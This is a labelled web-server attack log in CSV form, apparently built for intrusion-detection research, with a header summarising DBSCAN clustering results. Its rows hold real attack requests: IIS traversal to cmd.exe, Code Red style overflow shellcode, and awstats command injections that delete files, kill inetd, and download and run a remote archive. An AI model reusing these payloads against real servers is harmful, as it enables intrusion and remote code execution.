#------------------------------------------------------------------------------------------------------------
#  ~ DateTime: 2020-05-29 16:54:53
#  ~ Dataframe name: "http_access_log"
#  ~ Number of events in the dataframe: 3554
#  ~ Number of unique labels ('label_event_type') in the dataframe: 12
#  ~ Selected features set for the clustering: ['HTTP_method', 'ClientRequestLine@', 'StatusCode', 'ObjectSize~', 'Referrer~', 'Agent@']
#  ~ The dataframe was scaled using the scaler: MinMaxScaler
#  ~ Parameters:  EPS=0.10286568826994683  MinPts=2 (The EPS parameter was calculated in 0.006379 seconds)
#  ~ The DBSCAN clustering process was performed in 0.193605 seconds
#  ~ Results summary: (20 Clus. | 5 Outl. | Homg.: 99.93% | Comp.: 93.22% | V-measure: 96.46% | AR: 97.24% | AMI: 93.13%)
#
#  ~ Details of clusters:
#       Cluster [0] contains 484 items. MV:["AE0"]. Details:{'AE': 484}
#       Cluster [1] contains 979 items. MV:["AA1"]. Details:{'AA': 979}
#       Cluster [2] contains 109 items. MV:["AB2"]. Details:{'AB': 109}
#       Cluster [3] contains 86 items. MV:["AE3"]. Details:{'AE': 86}
#       Cluster [4] contains 587 items. MV:["AC4"]. Details:{'AC': 587}
#       Cluster [5] contains 23 items. MV:["AD5"]. Details:{'AD': 23}
#       Cluster [6] contains 14 items. MV:["AD6"]. Details:{'AD': 14}
#       Cluster [7] contains 3 items. MV:["AC7"]. Details:{'AC': 3}
#       Cluster [8] contains 46 items. MV:["AI8"]. Details:{'AI': 46}
#       Cluster [9] contains 100 items. MV:["AH9"]. Details:{'AH': 100}
#       Cluster [10] contains 125 items. MV:["AF10"]. Details:{'AF': 125}
#       Cluster [11] contains 16 items. MV:["AD11"]. Details:{'AD': 16}
#       Cluster [12] contains 32 items. MV:["AH12"]. Details:{'AH': 32}
#       Cluster [13] contains 769 items. MV:["AJ13"]. Details:{'AJ': 769}
#       Cluster [14] contains 14 items. MV:["AK14"]. Details:{'AK': 14}
#       Cluster [15] contains 54 items. MV:["AK15"]. Details:{'AE': 1, 'AK': 53}
#       Cluster [16] contains 5 items. MV:["AD16"]. Details:{'AD': 5}
#       Cluster [17] contains 57 items. MV:["AL17"]. Details:{'AL': 57}
#       Cluster [18] contains 23 items. MV:["AG18"]. Details:{'AG': 23}
#       Cluster [19] contains 23 items. MV:["AK19"]. Details:{'AK': 23}
#
#  ~ Details of outliers: {'AC': 1, 'AD': 1, 'AE': 3}
#
#  ~ Confusion matrix:
#     +--------+-----------------------------------------------------------------------------------+
#     | Actual +                                    Predicted                                      |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |        |  AA  |  AB  |  AC  |  AD  |  AE  |  AF  |  AG  |  AH  |  AI  |  AJ  |  AK  |  AL  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |   AA   | 979  |      |      |      |      |      |      |      |      |      |      |      |
#     |   AB   |      | 109  |      |      |      |      |      |      |      |      |      |      |
#     |   AC   |      |      | 590  |      |      |      |      |      |      |      |      |      |
#     |   AD   |      |      |      |  58  |      |      |      |      |      |      |      |      |
#     |   AE   |      |      |      |      | 570  |      |      |      |      |      |  1   |      |
#     |   AF   |      |      |      |      |      | 125  |      |      |      |      |      |      |
#     |   AG   |      |      |      |      |      |      |  23  |      |      |      |      |      |
#     |   AH   |      |      |      |      |      |      |      | 132  |      |      |      |      |
#     |   AI   |      |      |      |      |      |      |      |      |  46  |      |      |      |
#     |   AJ   |      |      |      |      |      |      |      |      |      | 769  |      |      |
#     |   AK   |      |      |      |      |      |      |      |      |      |      |  90  |      |
#     |   AL   |      |      |      |      |      |      |      |      |      |      |      |  57  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#
#  ~ Note: to import this file into Python, use: "DF = pandas.read_csv(file_name, sep=',', comment='#')"
#
#------------------------------------------------------------------------------------------------------------
DateTime~,Http_protocol@,ObjectSize~,Agent@,HTTP_method,ClientRequestLine@,StatusCode,ClientIP$,Referrer~,label_event_type~,label_IPpair_ID~,phase1_predicted_label~
1109898594,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9216084100130,"-","AA","S175","A_1"
1109898594,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9216084100130,"-","AA","S175","A_1"
1109898594,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9216084100130,"-","AA","S175","A_1"
1109898594,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9216084100130,"-","AA","S175","A_1"
1109898594,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9216084100130,"-","AA","S175","A_1"
1109898594,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9216084100130,"-","AA","S175","A_1"
1109898593,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9216084100130,"-","AA","S175","A_1"
1109898597,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9216084100130,"-","AA","S175","A_1"
1109898597,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9216084100130,"-","AA","S175","A_1"
1109898597,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9216084100130,"-","AA","S175","A_1"
1109898597,"-",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","'404'",9216084100130,"-","AA","S175","A_1"
1109899311,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9062177153106,"-","AE","S420","A_0"
1109901621,"HTTP/1.0",1061,"-","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","'404'",9060208186049,"-","AA","S355","A_1"
1109905834,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9219133137045,"-","AE","S236","A_0"
1109906900,"HTTP/1.0",982,"pxyscand/2.0","CONNECT","193.109.122.67:6668","'405'",9193109122049,"-","AD","S48","A_16"
1109908965,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9222166160009,"-","AE","S312","A_0"
1109911318,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9202226228178,"-","AE","S79","A_0"
1109918582,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218070058153,"-","AE","S218","A_0"
1109921305,"HTTP/1.1",365,"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts)","GET","/cgi-bin/awstats.pl?configdir=%20%7c%20cd%20%2ftmp%3b%20rm%20-rf%20.aw%3b%20killall%20-9%20inetd%20%7c%20","'200'",9082049016150,"-","AK","S580","A_15"
1109923757,"HTTP/1.1",395,"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts)","GET","/cgi-bin/awstats.pl?configdir=%20%7c%20cd%20%2ftmp%3bwget%20www.shady.go.ro%2fa.tgz%3b%20tar%20zxf%20a.tgz%3b%20rm%20-f%20a.tgz%3b%20.%2fa%20%7c%20","'200'",9082049016150,"-","AK","S580","A_15"
1109926410,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9201252076247,"-","AE","S69","A_0"
1109939784,"HTTP/1.1",1051,"-","GET","/scripts/nsiislog.dll","'404'",9066030071074,"-","AA","S482","A_1"
1109953648,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9219061092147,"-","AE","S254","A_0"
1109957483,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9061010007016,"-","AE","S368","A_0"
1109960088,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9169152251099,"-","AE","S28","A_0"
1109961063,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9208039169124,"-","AE","S110","A_0"
1109962090,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9220168069150,"-","AE","S260","A_0"
1109966496,"HTTP/1.1",1060,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109966846,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109966873,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109966894,"HTTP/1.1",1060,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109966916,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109966937,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109966959,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109966985,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967025,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967047,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967069,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967093,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967113,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967134,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967160,"HTTP/1.1",1060,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967186,"HTTP/1.1",1059,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967207,"HTTP/1.1",1060,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967247,"HTTP/1.1",1060,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967292,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967333,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967376,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967421,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967519,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109967559,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968574,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968597,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968620,"HTTP/1.1",1060,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968641,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968662,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968684,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968710,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968751,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968772,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968794,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968816,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968842,"HTTP/1.1",1062,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968869,"HTTP/1.1",1060,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968896,"HTTP/1.1",1059,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968918,"HTTP/1.1",1060,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109968982,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109969023,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109969063,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109969104,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109969145,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109969212,"HTTP/1.1",1063,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9216105210091,"-","AC","S165","A_4"
1109982999,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9221216011068,"-","AE","S281","A_0"
1109984595,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1109984595,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1109984595,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1109984595,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1109984598,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1109984598,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1109984598,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1109984598,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1109984598,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1109984598,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1109984598,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1109984599,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1109984599,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1109984599,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1109984599,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1109984599,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9060248032153,"-","AA","S359","A_1"
1110005477,"HTTP/1.0",1061,"-","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","'404'",9061054219221,"-","AA","S414","A_1"
1110007816,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9203197081072,"-","AE","S91","A_0"
1110010773,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9069245134153,"-","AE","S546","A_0"
1110015025,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9065163207149,"-","AE","S457","A_0"
1110015026,"HTTP/1.1",2326,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/icons/apache_pb.gif","'200'",9065163207149,"http://11.11.79.125/","AE","S457","A_OUTLIER"
1110015026,"HTTP/1.1",581,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/icons/powered_by.gif","'200'",9065163207149,"http://11.11.79.125/","AE","S457","A_OUTLIER"
1110017578,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9067138199071,"-","AE","S496","A_0"
1110025718,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025720,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025720,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025721,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025721,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025722,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025722,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025723,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025723,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025726,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025726,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025727,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025727,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025728,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025728,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025729,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025730,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025731,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025732,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025732,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025734,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025735,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110025735,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9061081096175,"-","AA","S416","A_1"
1110034834,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9035011228062,"-","AE","S346","A_0"
1110043944,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9202100197118,"-","AE","S72","A_0"
1110045697,"HTTP/1.0",1061,"-","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","'404'",9221136082153,"-","AA","S274","A_1"
1110048309,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9128107253041,"-","AE","S6","A_0"
1110052069,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9067162253025,"-","AA","S499","A_1"
1110052070,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9067162253025,"-","AA","S499","A_1"
1110052071,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9067162253025,"-","AA","S499","A_1"
1110052071,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9067162253025,"-","AA","S499","A_1"
1110052072,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9067162253025,"-","AA","S499","A_1"
1110052073,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9067162253025,"-","AA","S499","A_1"
1110052073,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9067162253025,"-","AA","S499","A_1"
1110052074,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9067162253025,"-","AA","S499","A_1"
1110052075,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9067162253025,"-","AA","S499","A_1"
1110052075,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9067162253025,"-","AA","S499","A_1"
1110052076,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9067162253025,"-","AA","S499","A_1"
1110052077,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9067162253025,"-","AA","S499","A_1"
1110052077,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9067162253025,"-","AB","S499","A_2"
1110052078,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9067162253025,"-","AB","S499","A_2"
1110052078,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9067162253025,"-","AA","S499","A_1"
1110052079,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9067162253025,"-","AA","S499","A_1"
1110067501,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9202155147006,"-","AE","S77","A_0"
1110085303,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218088123204,"-","AE","S231","A_0"
1110092390,"HTTP/1.0",1061,"-","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","'404'",9066133205244,"-","AA","S467","A_1"
1110097799,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218075144177,"-","AE","S222","A_0"
1110104152,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9024196254170,"-","AE","S334","A_0"
1110104317,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9192195225006,"-","AE","S43","A_0"
1110108260,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218075019178,"-","AE","S223","A_0"
1110112341,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9065115046225,"-","AE","S452","A_0"
1110117158,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9219137079110,"-","AE","S241","A_0"
1110117571,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9219061008078,"-","AE","S253","A_0"
1110122322,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9208057191112,"-","AE","S113","A_0"
